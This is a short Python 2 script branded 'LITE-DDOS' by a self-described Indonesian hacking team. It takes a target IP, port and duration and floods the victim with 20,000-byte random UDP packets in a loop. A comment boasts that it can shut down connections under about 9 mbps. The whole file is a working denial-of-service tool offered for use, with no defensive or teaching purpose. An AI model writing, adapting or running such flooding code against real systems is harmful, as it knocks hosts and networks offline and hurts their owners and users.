import time
import socket
import random
import sys
def usage():
    print "\033[1;32m#########################################################"
    print "#------------------------[\033[1;91mLITE-DDOS\033[1;32m]---------------------#"
    print "#-------------------------------------------------------#"
    print "#   \033[1;91mCommand: " "python2 paidlite.py " "<ip> <port> <packet> \033[1;32m   #"
    print "#                                                       #"
    print "#\033[1;91mCreator:KeepAlive  \033[1;32m##      ###       ##                #"
    print "#\033[1;91mTeam   : ISL        \033[1;32m##     #          ##                #"
    print "#\033[1;91mVersion:1.0        \033[1;32m##      ###       ##                #"
    print "#                   ## \033[1;91m ##     \033[1;32m#  \033[1;91m##  \033[1;32m##                #"
    print "#                   ##  \033[1;91m##  \033[1;32m###   \033[1;91m##  \033[1;32m######            #"
    print "#               \033[1;91m<--[Indonesia Security paidLite]-->         \033[1;32m#"
    print "#########################################################"
    print "                        @@@@@@@@@@"
    print "                       @@@@@@@@@@@@"
    print "                     @@@@@@@@@@@@@@@@"
    print("paid by ati")
def flood(victim, vport, duration):
    # paid made for:3sc4p3dx1... :)
    # Same, but stronger, shows u the dark side. can:-9,-8mbps. if someomes basic is under 9mbps or less  it has pretty good chance of shutting down, u n>
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 20000 sent
    bytes = random._urandom(20000)
    timeout =  time.time() + duration
    sent = 3000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 10000
        print "\033[1;91sending \033[1;32m%s \033[1;91sending \033[1;32m%s \033[1;91mpada port \033[1;32m%s "%(sent, victim, vport)
def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()










